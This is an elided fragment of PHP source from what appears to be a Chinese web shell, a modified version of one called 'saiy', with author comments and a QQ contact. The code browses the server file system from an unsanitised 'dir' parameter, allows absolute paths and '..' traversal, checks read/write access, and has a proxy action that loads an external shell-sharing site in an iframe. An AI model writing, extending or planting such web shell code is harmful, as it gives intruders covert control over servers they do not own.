...
@set_time_limit(0);
/*
200601180837 在saiy的基础上 没有增加功能 仅修改了两处：
1 程序路径显示问题(不能判断绝对路径) 输入C:\目录 浏览后路径错误？
2 加入只对目录操作的判断 by vvICOvv 如果对目录操作才显示目录操作列表
3 QQ:41091228 欢迎测试
*/
...
//	$nowpath = getPath($pathname, $dir);
//}
//modify by vvICOvv 程序路径显示问题(不能判断绝对路径)
//start 1/1
else {
	$dir=$_GET['dir'];
	$dir=str_replace('\\','/',$dir);
	...
	//根据":"判断是否是绝对路径
	if (!strchr($dir,':')){$nowpath = getPath($pathname, $dir);}
	else {$nowpath = getPath('',$dir);}
	
	$nowpath=$nowpath.'/';
	//将第一个'/'去掉
	if($nowpath[0]=='/')$nowpath[0]='';
	//程序向上跳了 需要修改url显示
	if(strstr($dir,'..'))
	echo "<meta http-equiv=\"refresh\" content=\"0;URL=".$self."?dir=".$nowpath."\">";
}
//end 1/1
// 判断读写情况
...
?>
<?
//加入只对目录操作的判断 by vvICOvv
//start 1/2
	if ($_GET['action'] == "dir" or $_GET['dir'] <> "") 
	{
//END 1/2
...
elseif ($_GET['action'] == "proxy") {
	...
	$tb->tdbody('URL: '.$tb->makeinput('url','http://www.51shell.cn','','text','100').' '.$tb->makeinput('','浏览','','submit'),'center','1','40');
	$tb->tdbody('<iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="http://www.51shell.cn"></iframe>');
	echo "</form>";
	$tb->tablefooter();
}//end proxy
